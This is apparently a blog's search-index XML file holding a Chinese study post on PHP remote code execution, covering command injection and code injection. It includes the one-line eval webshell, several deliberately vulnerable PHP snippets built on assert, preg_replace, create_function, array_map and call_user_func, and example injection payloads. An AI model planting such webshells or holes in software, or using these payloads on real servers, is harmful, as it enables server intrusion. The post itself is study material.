<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RCE</title>
    <url>/2020/03/12/RCE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCE：命令执行漏洞"><a href="#RCE：命令执行漏洞" class="headerlink" title="RCE：命令执行漏洞"></a>RCE：命令执行漏洞</h1><h2 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h2><ul>
<li>系统命令执行函数引用了用户可控变量且未进行过滤,注入恶意系统命令，可以使用命令连接符：|，||，&amp;，&amp;&amp;</li>
<li>常见函数：<pre><code>php中的 `exec(),system(),passthru(),shell_exec()...`</code></pre></li>
</ul>
<hr>
<h2 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2.代码注入"></a>2.代码注入</h2><ul>
<li><p>代码注入函数引用了用户可控变量且未进行过滤，注入恶意脚本代码，常用的一句话木马就是人为生产的代码注入漏洞</p>
</li>
<li><p>常见函数</p>
<pre><code>php中的 `assert(),eval(),preg_replace(),create_function(),array_map(),call_user_func(),call_user_func_array()...`</code></pre><ul>
<li><p>案例1</p>
<p>  <code>eval()</code>函数:将字符串作为php代码执行，常见的一句话木马：<code>&lt;?php eval($_POST[cmd]);?&gt;</code>cmd就是一句话木马的密码。</p>
</li>
<li><p>案例2</p>
<p>  <code>assert()</code>动态函数，<code>php代码：&lt;?php
  $_GET[0]($_REQUEST[1]);
  ?&gt;,  payload:?0=assert&amp;1=phpinfo()</code>,此处assert不可替换成eval,因为assert是动态函数，其中菜刀连接的链接为<code>http://ip/RCE/index.php?0=assert</code>,密码为 <code>1</code></p>
</li>
<li><p>案例3</p>
<p>  <code>preg_replace()</code>执行一个正则表达式的搜索和替换，如果正则表达式中有e修正符，则第二个参数的字符串当作php代码执行<code>&lt;?php echo preg_replace(&quot;/test/e&quot;,$_POST[cmd],&quot;something test&quot;);?&gt;</code><br>  cmd就是一句话木马的密码。</p>
</li>
<li><p>案例4 </p>
<p>  <code>creat_function()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$code &#x3D; $_REQUEST[cmd];</span><br><span class="line">$str &#x3D; &#39;echo test&#39;.$code.&quot;;&quot;;</span><br><span class="line">$x&#x3D;create_function(&#39;$code&#39;,$str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?cmd=1;}phpinfo();/*</code>注意闭合<code>creat_function()</code>函数</p>
</li>
<li><p>案例5</p>
<p>  <code>array_map()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">$arr[0]&#x3D;$eval_cmd;</span><br><span class="line">$new_arr &#x3D; array_map($eval_func,$arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
<li><p>案例6</p>
<p>  <code>call_user_func()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func($eval_func,$eval_cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
<li><p>案例7</p>
<p>  <code>call_user_func_array()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func_array($eval_func,array($eval_cmd));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
</ul>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
